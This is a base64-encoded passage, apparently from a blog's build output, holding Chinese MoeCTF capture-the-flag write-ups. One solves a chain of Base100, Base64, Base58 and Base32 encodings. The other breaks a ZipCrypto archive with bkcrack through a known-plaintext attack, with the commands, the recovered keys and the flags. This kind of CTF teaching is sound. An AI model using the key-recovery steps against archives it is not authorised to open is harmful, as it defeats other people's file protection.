QpXHJcblxyXG5lbW9qaSA9IG9wZW4oJ2ZsYWc5LnR4dCcsIGVuY29kaW5nPSd1dGYtOCcpLnJlYWQoKS5zdHJpcCgpXHJcbnByaW50KGIxMDBfZGVjb2RlKGVtb2ppKS5kZWNvZGUoKSlcclxuXFxgXFxgXFxgXHJcblxyXG5cdThGOTNcdTUxRkEgMTA0IFx1NUI1N1x1ODI4Mlx1N0VBRlx1NTNFRlx1NjI1M1x1NTM3MCBBU0NJSVx1RkYwQ1x1NUU3Nlx1NEUxNFx1NEVFNSBcXGA9XFxgIFx1N0VEM1x1NUMzRSBcdTIwMTRcdTIwMTQgQmFzZTY0IFx1NUI5RVx1OTUyNFx1MzAwMlxyXG5cclxuIyMjIFN0ZXAgMiBcdTIwMTQgXHU5NEZFXHU1RjBGXHU1MjY1XHU3OUJCXHJcblxyXG5cdTRFMDBcdTVDNDJcdTVDNDJcdTUyNjVcdUZGMENcdTZCQ0ZcdTVDNDJcdTc1MjhcdTMwMENcdTdFRDNcdTY3OUNcdTY2MkZcdTU0MjYgMTAwJSBcdTUzRUZcdTYyNTNcdTUzNzAgQVNDSUlcdTMwMERcdTUyMjRcdTY1QURcdTY2MkZcdTU0MjZcdTUyNjVcdTVCRjlcdUZGMUFcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5pbXBvcnQgYmFzZTY0XHJcblxyXG5CNTggPSAnMTIzNDU2Nzg5QUJDREVGR0hKS0xNTlBRUlNUVVZXWFlaYWJjZGVmZ2hpamttbm9wcXJzdHV2d3h5eidcclxuXHJcbmRlZiBiNThkZWNvZGUocyk6XHJcbiAgICB2ID0gMFxyXG4gICAgZm9yIGMgaW4gczpcclxuICAgICAgICB2ID0gdiAqIDU4ICsgQjU4LmluZGV4KGMpXHJcbiAgICByZXR1cm4gdi50b19ieXRlcygodi5iaXRfbGVuZ3RoKCkgKyA3KSAvLyA4LCAnYmlnJylcclxuXHJcbkRFQ1MgPSBbXHJcbiAgICAoJ2I2NCcsIGJhc2U2NC5iNjRkZWNvZGUpLFxyXG4gICAgKCdiMzInLCBiYXNlNjQuYjMyZGVjb2RlKSxcclxuICAgICgnYjE2JywgYmFzZTY0LmIxNmRlY29kZSksXHJcbiAgICAoJ2I4NScsIGJhc2U2NC5iODVkZWNvZGUpLFxyXG4gICAgKCdhODUnLCBiYXNlNjQuYTg1ZGVjb2RlKSxcclxuICAgICgnYjU4JywgYjU4ZGVjb2RlKSxcclxuXVxyXG5cclxuY3VyID0gYjEwMF9kZWNvZGUoZW1vamkpLmRlY29kZSgpXHJcbndoaWxlIFRydWU6XHJcbiAgICBmb3IgbmFtZSwgZm4gaW4gREVDUzpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHIgPSBmbihjdXIpXHJcbiAgICAgICAgICAgIGlmIHIgYW5kIGxlbihyKSA+PSA0IGFuZCBhbGwoMzIgPD0geCA8IDEyNyBmb3IgeCBpbiByKTpcclxuICAgICAgICAgICAgICAgIHByaW50KGYnW3tuYW1lfV0gLT4ge3IuZGVjb2RlKCl9JylcclxuICAgICAgICAgICAgICAgIGN1ciA9IHIuZGVjb2RlKClcclxuICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgcGFzc1xyXG4gICAgZWxzZTpcclxuICAgICAgICBicmVha1xyXG5wcmludCgnRkxBRzonLCBjdXIpXHJcblxcYFxcYFxcYFxyXG5cclxuIyMjIFx1NUI4Q1x1NjU3NFx1OTRGRVx1OERFRlxyXG5cclxuXFxgXFxgXFxgdGV4dFxyXG5bYmFzZTEwMF0gTXpnelprMW1WbmM0ZFhCdGJXSjNlalJ2VEZoV1JFSlZRbFZZYWtkblNubFJORFptUTFGeVJqTXhRVVZ1UzJOVVIyRkJiVzVuVFc1b1ozTlNObFZ0ZGtGa1FuWkhObTlLVmpSRmFrVT1cclxuW2I2NF0gICAgIDM4M2ZNZlZ3OHVwbW1id3o0b0xYVkRCVUJVWGpHZ0p5UTQ2ZkNRckYzMUFFbktjVEdhQW1uZ01uaGdzUjZVbXZBZEJ2RzZvSlY0RWpFXHJcbltiNThdICAgICBOVlhXS1kzVU1aNVRHM0pRTklRVjZNSlZMNDJUQVgzRE9VM1RHWFpTR01aVEdNWlRHTjZRPT09PVxyXG5bYjMyXSAgICAgbW9lY3RmezNtMGohXzE1XzUwX2N1NzNfMjMzMzMzM31cclxuXFxgXFxgXFxgXHJcblxyXG58IFx1NUM0MiB8IFx1N0YxNlx1NzgwMSB8IFx1OEJDNlx1NTIyQlx1NzI3OVx1NUY4MSB8XHJcbnwtLS0tfC0tLS0tLXwtLS0tLS0tLS0tfFxyXG58IDEgfCBCYXNlMTAwIChFbW9qaSkgfCA0IFx1NUI1N1x1ODI4MiBVVEYtOFx1RkYwQ1x1N0IyQ1x1NEUwOVx1NUI1N1x1ODI4Mlx1NTNFQVx1NTcyOCBcXGA5MFxcYCAvIFxcYDkxXFxgIHxcclxufCAyIHwgQmFzZTY0IHwgXHU0RUU1IFxcYD1cXGAgXHU4ODY1XHU5RjUwXHU3RUQzXHU1QzNFIHxcclxufCAzIHwgQmFzZTU4IHwgXHU1MTY4XHU0RTMyXHU0RTBEXHU1NDJCIFxcYDBcXGAgXFxgT1xcYCBcXGBJXFxgIFxcYGxcXGAgfFxyXG58IDQgfCBCYXNlMzIgfCBcdTUzRUFcdTY3MDkgXFxgQVx1MjAxM1pcXGAgXHU0RTBFIFxcYDJcdTIwMTM3XFxgXHVGRjBDXHU5NTdGXHU1RUE2XHU2NjJGIDggXHU3Njg0XHU1MDBEXHU2NTcwIHxcclxuXHJcbiMjIEZsYWdcclxuXHJcblxcYFxcYFxcYHRleHRcclxubW9lY3RmezNtMGohXzE1XzUwX2N1NzNfMjMzMzMzM31cclxuXFxgXFxgXFxgXHJcblxyXG4jIyBcdTc3RTVcdThCQzZcdTcwQjlcclxuXHJcbi0gKipCYXNlMTAwKipcdUZGMUExIGVtb2ppID0gMSBieXRlXHVGRjBDXHU3RjE2XHU3ODAxXHU4ODY4XHU0RUNFIFxcYFUrMUY0MDBcXGAgXHU4RDc3XHU1MTcxIDEyOCBcdTRFMkEgZW1vamlcdUZGMENcXGAoYnl0ZSArIDU1KVxcYCBcdTYyQzZcdTYyMTAgNiArIDYgXHU0RjREXHU1ODVFXHU4RkRCIFVURi04IFx1NUMzRVx1NUI1N1x1ODI4MlxyXG4tICoqXHU5NEZFXHU1RjBGXHU1MjY1XHU3OUJCXHU3Njg0XHU5MDFBXHU3NTI4XHU1OTU3XHU4REVGKipcdUZGMUFcdTZCQ0ZcdTUyNjVcdTRFMDBcdTVDNDJcdTVDMzFcdTY4QzBcdTY3RTVcdTMwMENcdTY2MkZcdTU0MjYgMTAwJSBcdTUzRUZcdTYyNTNcdTUzNzAgQVNDSUkgXHU0RTE0XHU5NTdGXHU1RUE2IFx1MjI2NSA0XHUzMDBEXHVGRjBDXHU2NjJGXHU1MjE5XHU3RUU3XHU3RUVEXHU1MjY1XHVGRjBDXHU1NDI2XHU1MjE5XHU2MzYyXHU0RTBCXHU0RTAwXHU0RTJBXHU4OUUzXHU3ODAxXHU1NjY4XHJcbi0gKipCYXNlNTggXHU3Njg0XHU2MzA3XHU3RUI5KipcdUZGMUFcdTVCNTdcdTdCMjZcdTk2QzZcdTYyOEEgXFxgMFxcYFx1RkYwOFx1OTZGNlx1RkYwOVx1MzAwMVxcYE9cXGBcdUZGMDhcdTU5MjdcdTUxOTkgb1x1RkYwOVx1MzAwMVxcYElcXGBcdUZGMDhcdTU5MjdcdTUxOTkgaVx1RkYwOVx1MzAwMVxcYGxcXGBcdUZGMDhcdTVDMEZcdTUxOTkgTFx1RkYwOVx1NTE2OFx1NTI1NFx1NEU4Nlx1RkYwQ1x1NjI0MFx1NEVFNVx1OEZEOSA0IFx1NEUyQVx1NUI1N1x1N0IyNlx1NEUwMFx1NkIyMVx1OTBGRFx1NEUwRFx1NEYxQVx1NTFGQVx1NzNCMFxyXG4tICoqQmFzZTMyIFx1NzY4NFx1NjMwN1x1N0VCOSoqXHVGRjFBXHU1QjU3XHU2QkNEXHU4ODY4XHU1M0VBXHU2NzA5IFxcYEFcdTIwMTNaXFxgIFx1NTJBMCBcXGAyXHUyMDEzN1xcYFx1RkYwQ1x1OTU3Rlx1NUVBNlx1NjYyRiA4IFx1NzY4NFx1NTAwRFx1NjU3MFx1RkYwQ1xcYD1cXGAgXHU4ODY1XHU5RjUwXHJcbmBcclxuICB9LFxyXG5cclxuICAnbW9lY3RmLXppcGNyeXB0byc6IHtcclxuICAgIHRpdGxlOiAnWklQIFx1NURGMlx1NzdFNVx1NjYwRVx1NjU4N1x1NjUzQlx1NTFGQiAoYmtjcmFjayknLFxyXG4gICAgc3VidGl0bGU6ICdcdTYzRDBcdTc5M0FcdThCRURcdTUzNzNcdTY2MEVcdTY1ODcgKyBaaXBDcnlwdG8nLFxyXG4gICAgY29udGVudDogYFxyXG4jIFpJUCBcdTVERjJcdTc3RTVcdTY2MEVcdTY1ODdcdTY1M0JcdTUxRkIgKGJrY3JhY2spIFx1MjAxNCBcdTVGNTNcdTYzRDBcdTc5M0FcdThCRURcdTVDMzFcdTY2MkZcdTY2MEVcdTY1ODdcclxuXHJcbioqUGxhdGZvcm0qKjogTW9lQ1RGXHJcbioqVHlwZSoqOiBNaXNjIC8gQ3J5cHRvXHJcbioqRGlmZmljdWx0eSoqOiBNZWRpdW1cclxuKipGbGFnKio6IFxcYG1vZWN0ZnsxdF9pNV9TbzBvMG8wb19PYnYxb3U1fVxcYFxyXG5cclxuIyMgXHU5ODk4XHU3NkVFXHJcblxyXG5cdTZDQTFcdTY3MDlcdTZFOTBcdTc4MDFcdTMwMDFcdTZDQTFcdTY3MDlcdTk3NzZcdTY3M0FcdUZGMENcdTUzRUFcdTY3MDlcdTRFMDBcdTUzRTVcdTYzRDBcdTc5M0FcdTU0OENcdTRFMDBcdTRFRkRcdTk2NDRcdTRFRjZcdUZGMUFcclxuXHJcbj4gXHU2NzA5XHU2NUY2XHU1MDE5XHVGRjBDXHU0RTAwXHU3RUJGXHU3NTFGXHU2NzNBXHU1RjgwXHU1RjgwXHU4NUNGXHU1NzI4XHU2NzAwXHU2NjBFXHU2NjNFXHU3Njg0XHU1NzMwXHU2NUI5XHJcblxyXG5cdTU5MTZcdTUyQTBcdTRFMDBcdTRFMkEgMzg4IFx1NUI1N1x1ODI4Mlx1NzY4NCBcXGBmbGFnLnppcFxcYFx1MzAwMlxyXG5cclxuIyMgXHU5ODk4XHU3NkVFXHU1MjA2XHU2NzkwXHJcblxyXG5cdTUxNDhcdTUyMkJcdTYwMjVcdTc3NDBcdTRFMEEgcm9ja3lvdVx1RkYwQ1x1NjI4QSBaSVAgXHU3RUQzXHU2Nzg0XHU2MjUyXHU1RjAwXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBweXRob25cclxuaW1wb3J0IHN0cnVjdFxyXG5cclxuZCA9IG9wZW4oJ2ZsYWcuemlwJywgJ3JiJykucmVhZCgpXHJcbmVvY2QgPSBkLnJmaW5kKGInUEtcXFxceDA1XFxcXHgwNicpXHJcbm4gICA9IHN0cnVjdC51bnBhY2soJzxIJywgZFtlb2NkKzEwOmVvY2QrMTJdKVswXVxyXG5vZmYgPSBzdHJ1Y3QudW5wYWNrKCc8SScsIGRbZW9jZCsxNjplb2NkKzIwXSlbMF1cclxuXHJcbmZvciBfIGluIHJhbmdlKG4pOlxyXG4gICAgZmxhZywgY29tcCwgXywgXywgY3JjLCBjc3osIHVzeiwgbmwsIGVsLCBjbCwgXywgXywgXywgbGhvID0gXFxcXFxyXG4gICAgICAgIHN0cnVjdC51bnBhY2soJzxJSEhISElJSUhISEhISUknLCBkW29mZjpvZmYrNDZdKVxyXG4gICAgbmFtZSA9IGRbb2ZmKzQ2Om9mZis0NitubF0uZGVjb2RlKClcclxuICAgIHByaW50KGYne25hbWV9OiBmbGFncz0weHtmbGFnOjA0eH0gY29tcD17Y29tcH0gY3JjPTB4e2NyYzowOHh9IGNzaXplPXtjc3p9IHVzaXplPXt1c3p9JylcclxuICAgIG9mZiArPSA0NiArIG5sICsgZWwgKyBjbFxyXG5cXGBcXGBcXGBcclxuXHJcblx1OEY5M1x1NTFGQVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgdGV4dFxyXG5mbGFnLnR4dCA6IGZsYWdzPTB4MDAwOSBjb21wPTAgY3JjPTB4YjVlNGYxNGYgY3NpemU9NDIgdXNpemU9MzBcclxuUkVBRE1FLm1kOiBmbGFncz0weDAwMDkgY29tcD0wIGNyYz0weGIxNTk0ODNhIGNzaXplPTY2IHVzaXplPTU0XHJcblxcYFxcYFxcYFxyXG5cclxuXHU0RTA5XHU0RTJBXHU3RUQzXHU4QkJBXHVGRjFBXHJcblxyXG4xLiBcXGBmbGFncyAmIDFcXGAgXHU3RjZFXHU0RjREIFx1MjE5MiBcdTY3NjFcdTc2RUVcdTg4QUJcdTY4MDdcdThCQjBcdTRFM0FcdTUyQTBcdTVCQzZcclxuMi4gXFxgY29tcD0wXFxgXHVGRjA4U3RvcmVkXHVGRjA5XHU0RTE0IFxcYGNzaXplID09IHVzaXplICsgMTJcXGAgXHUyMTkyIFx1NTkxQVx1NTFGQVx1NzY4NCAxMiBcdTVCNTdcdTgyODJcdTY2MkYgWmlwQ3J5cHRvIFx1NTJBMFx1NUJDNlx1NTkzNFx1RkYwQ1x1OEJGNFx1NjYwRVx1NjYyRioqXHU3NzFGXHU1MkEwXHU1QkM2KipcclxuMy4gXHU1MzA1XHU5MUNDXHU5NjY0XHU0RTg2IGZsYWcgXHU4RkQ4XHU2NzA5XHU0RTJBICoqUkVBRE1FLm1kKiogXHUyMDE0XHUyMDE0IFx1OEZEOVx1OTAxQVx1NUUzOFx1NjYyRlx1NTFGQVx1OTg5OFx1NEVCQVx1NzY4NFx1NjNEMFx1NzkzQVx1NjU4N1x1NEVGNlxyXG5cclxuPiBcdTg4NjVcdTRFMDBcdTUzRTVcdUZGMUFcXGBjc2l6ZSA9PSB1c2l6ZVxcYCBcdTYyNERcdTUzRUZcdTgwRkRcdTY2MkYqKlx1NEYyQVx1NTJBMFx1NUJDNioqXHVGRjBDXHU2MjhBIGxvY2FsICsgY2VudHJhbCBoZWFkZXIgXHU3Njg0IGJpdCAwIFx1NkUwNVx1NjM4OVx1NUMzMVx1ODBGRFx1NzZGNFx1NjNBNVx1ODlFM1x1NTM4Qlx1MzAwMlx1NjcyQ1x1OTg5OFx1NEUwRFx1NjYyRlx1MzAwMlxyXG5cclxuIyMgXHU3ODM0XHU5ODk4XHU3MEI5XHVGRjFBXHU2M0QwXHU3OTNBXHU4QkVEXHU1QzMxXHU2NjJGXHU2NjBFXHU2NTg3XHJcblxyXG5cdTMwMENcdTY3MDBcdTY2MEVcdTY2M0VcdTc2ODRcdTU3MzBcdTY1QjlcdTMwMERcdTIwMTRcdTIwMTQgXHU2M0QwXHU3OTNBXHU4QkVEXHU2NzJDXHU4RUFCXHUzMDAyXHU2NUUyXHU3MTM2XHU1NDBDXHU1MzA1XHU5MUNDXHU2NzA5XHU0RTJBIFJFQURNRS5tZFx1RkYwQ1x1NUI4M1x1NzY4NFx1NTE4NVx1NUJCOVx1NUY4OFx1NTNFRlx1ODBGRFx1NUMzMVx1NjYyRlx1OEZEOVx1NTNFNVx1NjNEMFx1NzkzQVx1NTM5Rlx1NjU4N1x1MzAwMlxyXG5cclxuXHU4MDBDXHU0RTE0IFpJUCBcdTU5MzRcdTkwRThcdTVCNThcdTc2ODRcdTY2MkYqKlx1NjYwRVx1NjU4NyoqXHU3Njg0IENSQzMyXHVGRjBDXHU0RTBEXHU3NTI4XHU4OUUzXHU1QkM2XHU1QzMxXHU4MEZEXHU5QThDXHU4QkMxXHU3MzFDXHU2MEYzXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBweXRob25cclxuaW1wb3J0IHpsaWJcclxudGFyZ2V0ID0gMHhiMTU5NDgzYSAgICAgICAgICAjIFJFQURNRS5tZCBcdTU5MzRcdTkwRThcdTc2ODQgQ1JDXHJcbnMgPSAnXHU2NzA5XHU2NUY2XHU1MDE5XHVGRjBDXHU0RTAwXHU3RUJGXHU3NTFGXHU2NzNBXHU1RjgwXHU1RjgwXHU4NUNGXHU1NzI4XHU2NzAwXHU2NjBFXHU2NjNFXHU3Njg0XHU1NzMwXHU2NUI5J1xyXG5wcmludChoZXgoemxpYi5jcmMzMihzLmVuY29kZSgndXRmLTgnKSkgJiAweGZmZmZmZmZmKSlcclxuIyAweGIxNTk0ODNhICBcdTI3MDUgXHU1NDdEXHU0RTJEXHJcblxcYFxcYFxcYFxyXG5cclxuXHU1QjU3XHU4MjgyXHU2NTcwXHU0RTVGXHU1QkY5XHU1Rjk3XHU0RTBBXHVGRjFBMTggXHU0RTJBXHU2QzQ5XHU1QjU3IFx1MDBENyAzIFx1NUI1N1x1ODI4MiBVVEYtOCA9IDU0IFx1NUI1N1x1ODI4MiA9IFxcYHVzaXplXFxgXHUzMDAyKipcdTVERjJcdTc3RTVcdTY2MEVcdTY1ODdcdTUyMzBcdTYyNEJcdTMwMDIqKlxyXG5cclxuXHU2Q0U4XHU2MTBGXHU1MjJCXHU1MkEwXHU1QzNFXHU5NjhGXHU2MzYyXHU4ODRDXHVGRjBDXFxgdXNpemU9NTRcXGAgXHU2QjYzXHU1OTdEXHU1MzYxXHU2QjdCXHU5NTdGXHU1RUE2XHUzMDAyXHJcblxyXG4jIyBcdTg5RTNcdTk4OThcdTZCNjVcdTlBQTRcclxuXHJcbiMjIyBTdGVwIDEgXHUyMDE0IFx1NUJGQ1x1NTFGQVx1NURGMlx1NzdFNVx1NjYwRVx1NjU4N1xyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5weXRob24gLWMgXCJvcGVuKCdrbm93bi5iaW4nLCd3YicpLndyaXRlKCdcdTY3MDlcdTY1RjZcdTUwMTlcdUZGMENcdTRFMDBcdTdFQkZcdTc1MUZcdTY3M0FcdTVGODBcdTVGODBcdTg1Q0ZcdTU3MjhcdTY3MDBcdTY2MEVcdTY2M0VcdTc2ODRcdTU3MzBcdTY1QjknLmVuY29kZSgndXRmLTgnKSlcIlxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyBTdGVwIDIgXHUyMDE0IGJrY3JhY2sgXHU2MDYyXHU1OTBEXHU1MTg1XHU5MEU4XHU1QkM2XHU5NEE1XHJcblxyXG5ia2NyYWNrIFx1ODFGM1x1NUMxMVx1OTcwMFx1ODk4MSAxMiBcdTVCNTdcdTgyODJcdTVERjJcdTc3RTVcdTY2MEVcdTY1ODdcdUZGMENcdTYyMTFcdTRFRUNcdTY3MDkgNTQgXHU1QjU3XHU4MjgyXHVGRjBDXHU3RUYwXHU3RUYwXHU2NzA5XHU0RjU5XHVGRjFBXHJcblxyXG5cXGBcXGBcXGBiYXNoXHJcbmJrY3JhY2sgLUMgZmxhZy56aXAgLWMgUkVBRE1FLm1kIC1wIGtub3duLmJpblxyXG5cXGBcXGBcXGBcclxuXHJcblx1OEREMVx1N0VBNiAzIFx1NTIwNlx1OTQ5Rlx1RkYwQ1x1NjJGRlx1NTIzMFx1NEUwOVx1NEUyQSAzMiBcdTRGNERcdTUxODVcdTkwRThcdTVCQzZcdTk0QTVcdUZGMUFcclxuXHJcblxcYFxcYFxcYHRleHRcclxuODAuMyAlICgxMzUyOTAgLyAxNjg1ODQpXHJcbkZvdW5kIGEgc29sdXRpb24uIFN0b3BwaW5nLlxyXG5cclxuWzIzOjM4OjA4XSBLZXlzXHJcbjM5Y2Q4MDliIDEwYTBmY2IyIDY2OWE2OGY3XHJcblxcYFxcYFxcYFxyXG5cclxuIyMjIFN0ZXAgMyBcdTIwMTQgXHU3NTI4XHU1QkM2XHU5NEE1XHU3NkY0XHU2M0E1XHU2NTM5XHU1QkM2XHU3ODAxXHJcblxyXG5cdTYyRkZcdTUyMzBcdTUxODVcdTkwRThcdTVCQzZcdTk0QTVcdTU0MEVcdTVDMzEqKlx1NEUwRFx1NUZDNVx1OEZEOFx1NTM5Rlx1NTM5Rlx1NTlDQlx1NTNFM1x1NEVFNCoqXHU0RTg2IFx1MjAxNFx1MjAxNCBaaXBDcnlwdG8gXHU3Njg0IFxcYHVwZGF0ZV9rZXlzXFxgIFx1NjYyRlx1NUI4Q1x1NTE2OFx1NTNFRlx1OTAwNlx1NzY4NFx1RkYwQ2JrY3JhY2sgXHU1M0VGXHU0RUU1XHU2MjhBXHU1QkM2XHU2NTg3XHUzMDBDXHU5MUNEXHU2MjUzXHU1MzA1XHUzMDBEXHU2MjEwXHU0RUZCXHU2MTBGXHU2NUIwXHU1QkM2XHU3ODAxXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBiYXNoXHJcbmJrY3JhY2sgLUMgZmxhZy56aXAgLWsgMzljZDgwOWIgMTBhMGZjYjIgNjY5YTY4ZjcgLVUgdW5sb2NrZWQuemlwIDEyMzQ1NlxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyBTdGVwIDQgXHUyMDE0IFx1ODlFM1x1NTM4QlxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG51bnppcCAtUCAxMjM0NTYgdW5sb2NrZWQuemlwXHJcblxcYFxcYFxcYFxyXG5cclxuXFxgXFxgXFxgdGV4dFxyXG5mbGFnLnR4dCA6IG1vZWN0ZnsxdF9pNV9TbzBvMG8wb19PYnYxb3U1fVxyXG5SRUFETUUubWQ6IFx1NjcwOVx1NjVGNlx1NTAxOVx1RkYwQ1x1NEUwMFx1N0VCRlx1NzUxRlx1NjczQVx1NUY4MFx1NUY4MFx1ODVDRlx1NTcyOFx1NjcwMFx1NjYwRVx1NjYzRVx1NzY4NFx1NTczMFx1NjVCOVxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyBTdGVwIDUgXHUyMDE0IFx1NjgyMVx1OUE4Q1xyXG5cclxuXHU3NTI4XHU1OTM0XHU5MEU4IENSQyBcdTU5MERcdTY4MzhcdUZGMENcdTc4NkVcdThCQTRcdTRFMERcdTY2MkZcdTVERTdcdTU0MDhcdUZGMUFcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG56bGliLmNyYzMyKG9wZW4oJ2ZsYWcudHh0JywncmInKS5yZWFkKCkpICAmIDB4ZmZmZmZmZmYgICAjIDB4YjVlNGYxNGYgXHUyNzA1XHJcbnpsaWIuY3JjMzIob3BlbignUkVBRE1FLm1kJywncmInKS5yZWFkKCkpICYgMHhmZmZmZmZmZiAgICMgMHhiMTU5NDgzYSBcdTI3MDVcclxuXFxgXFxgXFxgXHJcblxyXG4jIyBGbGFnXHJcblxyXG5cXGBcXGBcXGB0ZXh0XHJcbm1vZWN0ZnsxdF9pNV9TbzBvMG8wb19PYnYxb3U1fVxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIFx1NzdFNVx1OEJDNlx1NzBCOVxyXG5cclxufCBcdTUyMjRcdTYzNkUgfCBcdTU0MkJcdTRFNDkgfFxyXG58LS0tLS0tfC0tLS0tLXxcclxufCBcXGBmbGFncyAmIDFcXGAgfCBcdTUzRUFcdTY2MkZcdTMwMENcdTY4MDdcdThCQjBcdTRFM0FcdTUyQTBcdTVCQzZcdTMwMERcdUZGMENcdTRFMERcdTRFRTNcdTg4NjhcdTc3MUZcdTUyQTBcdTVCQzYgfFxyXG58IFxcYGNzaXplID09IHVzaXplICsgMTJcXGAgfCBcdTc3MUYgWmlwQ3J5cHRvXHVGRjA4MTIgXHU1QjU3XHU4MjgyXHU1MkEwXHU1QkM2XHU1OTM0XHVGRjA5IHxcclxufCBcXGBjc2l6ZSA9PSB1c2l6ZVxcYCB8IFx1NEYyQVx1NTJBMFx1NUJDNlx1RkYwQ1x1NkUwNVx1NjM4OSBoZWFkZXIgYml0IDAgXHU1MzczXHU1M0VGXHU4OUUzXHU1MzhCIHxcclxufCBcdTU5MzRcdTkwRTggQ1JDMzIgfCAqKlx1NjYwRVx1NjU4NyoqXHU3Njg0IENSQ1x1RkYwQ1x1NTNFRlx1NzlEMlx1N0VBN1x1OUE4Q1x1OEJDMVx1NjYwRVx1NjU4N1x1NzMxQ1x1NjBGMyB8XHJcblxyXG4tICoqYmtjcmFjayoqXHVGRjA4QmloYW1cdTIwMTNLb2NoZXIgXHU1REYyXHU3N0U1XHU2NjBFXHU2NTg3XHU2NTNCXHU1MUZCXHVGRjA5XHVGRjFBXHU1M0VBXHU4OTgxIDEyIFx1NUI1N1x1ODI4Mlx1NURGMlx1NzdFNVx1NjYwRVx1NjU4N1x1NUMzMVx1ODBGRFx1NjA2Mlx1NTkwRCBaaXBDcnlwdG8gXHU3Njg0XHU0RTA5XHU0RTJBXHU1MTg1XHU5MEU4XHU1QkM2XHU5NEE1XHJcbi0gXHU2NzA5XHU0RTg2XHU1MTg1XHU5MEU4XHU1QkM2XHU5NEE1XHU1QzMxXHU0RTBEXHU1RkM1XHU4RkQ4XHU1MzlGXHU1M0UzXHU0RUU0XHVGRjFBXFxgLVUgb3V0LnppcCBuZXdwYXNzXFxgIFx1NzZGNFx1NjNBNVx1OTFDRFx1NjI1M1x1NTMwNVxyXG4tIFpJUCBcdTU5MzRcdTkxQ0NcdThGRDhcdTY3MDlcdTRFMkEgKipjaGVjayBieXRlKipcdUZGMUFcdTUyQTBcdTVCQzZcdTU5MzRcdTdCMkMgMTIgXHU1QjU3XHU4MjgyXHU5MDFBXHU1RTM4XHU2NjJGIFxcYChjcmMgPj4gMjQpICYgMHhmZlxcYFx1RkYwOGZsYWdzIGJpdCAzIFx1N0Y2RVx1NEY0RFx1NjVGNlx1RkYwOVx1NjIxNiBcXGAoZG9zdGltZSA+PiA4KSAmIDB4ZmZcXGBcdUZGMENcdTY3MkNcdTY3NjVcdTUzRUZcdTRFRTVcdTc1MjhcdTY3NjVcdTVGRUJcdTkwMUZcdTdCNUJcdTUzRTNcdTRFRTRcclxuXHJcbiMjIFx1OEUyOVx1NTc1MVxyXG5cclxuMS4gKipcdTRFMDBcdTVGMDBcdTU5Q0JcdTYwRjNcdTcyMDZcdTc4MzRcdTVGMzFcdTUzRTNcdTRFRTQqKlx1RkYxQVx1NTE5OVx1NEU4NiA1MCBcdTRFMkFcdTUwMTlcdTkwMDlcdTUzRTNcdTRFRTRcdTUxNjhcdTYzMDJcdTMwMDJcdTgwMENcdTRFMTRcdTY3MkNcdTk4OThcdTc1MUZcdTYyMTBcdTU2NjhcdTUxOTlcdTc2ODRcdTY2MkZcdTk2OEZcdTY3M0EgY2hlY2sgYnl0ZVx1RkYwOFxcYGhkclsxMV0gPSAweDZlXFxgXHVGRjBDXHU4MDBDIFxcYGNyYz4+MjQgPSAweGI1XFxgXHUzMDAxXFxgdGltZT4+OCA9IDB4OGFcXGAgXHU5MEZEXHU1QkY5XHU0RTBEXHU0RTBBXHVGRjA5XHVGRjBDXHU4RkRFXHUzMDBDXHU1RkVCXHU5MDFGXHU3QjVCXHUzMDBEXHU4RkQ5XHU2NzYxXHU4REVGXHU5MEZEXHU2NUFEXHU0RTg2XHJcbjIuICoqYmtjcmFjayBcdTc2ODRcdThGREJcdTVFQTZcdTc1MjggXFxgXFxcXHJcXGAgXHU1MjM3XHU1QzRGKipcdUZGMUFcdTc2RjRcdTYzQTVcdThERDFcdTRGMUFcdTZERjlcdTZDQTFcdTdCQTFcdTkwNTNcdTMwMDFcdTg4QUJcdTUyMjRcdTVCOUFcdTRFM0FcdTUzNjFcdTZCN0JcdTMwMDJcdTg5ODEgXFxgPiBiay5sb2cgMj4mMVxcYCBcdTkxQ0RcdTVCOUFcdTU0MTFcdTUyMzBcdTY1RTVcdTVGRDdcdTY1ODdcdTRFRjZcdTU0MEVcdTUzRjBcdThERDFcdUZGMENcdTUxOERcdTc1MjggXFxgdHIgJ1xcXFxyJyAnXFxcXG4nIDwgYmsubG9nXFxgIFx1NzcwQlx1N0VEM1x1Njc5Q1xyXG4zLiAqKlx1NEUwQlx1OEY3RCBia2NyYWNrIFx1NTIyQlx1NzE2N1x1NjI4NFx1NjVFN1x1NzI0OFx1NjcyQ1x1NTNGNyoqXHVGRjFBdjEuNy4wIFx1NzY4NCByZWxlYXNlIFVSTCBcdTVERjJcdTdFQ0YgNDA0XHVGRjBDXHU3NTI4IEdpdEh1YiBBUEkgXFxgcmVwb3Mva2ltY2k4Ni9ia2NyYWNrL3JlbGVhc2VzL2xhdGVzdFxcYCBcdTYyRkZcdTY3MDBcdTY1QjBcdTcyNDhcdTY3MkNcdTUzRjdcdUZGMDhcdTUxOTlcdThGRDlcdTdCQzdcdTY1RjZcdTY2MkYgdjEuOC4xXHVGRjA5XHJcbjQuICoqUHl0aG9uIFx1ODFFQVx1NUUyNiBcXGB6aXBmaWxlXFxgIFx1NzY4NCBaaXBDcnlwdG8gXHU2NjJGXHU3RUFGIFB5dGhvbiBcdTVCOUVcdTczQjAqKlx1RkYwQ1x1NkJENCBia2NyYWNrIFx1NjE2Mlx1NTFFMFx1NTM0MVx1NTAwRFx1RkYwQ1x1NTIyQlx1NjJGRlx1NUI4M1x1NzIwNlx1NzgzNFxyXG5gXHJcbiAgfVxyXG5cclxufVxyXG4iLCAiY29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2Rpcm5hbWUgPSBcIkM6XFxcXFVzZXJzXFxcXGh3aFxcXFxibG9nXFxcXGZyb250ZW5kXFxcXHNyY1xcXFxkYXRhXFxcXGtiXCI7Y29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2ZpbGVuYW1lID0gXCJDOlxcXFxVc2Vyc1xcXFxod2hcXFxcYmxvZ1xcXFxmcm9udGVuZFxcXFxzcmNcXFxcZ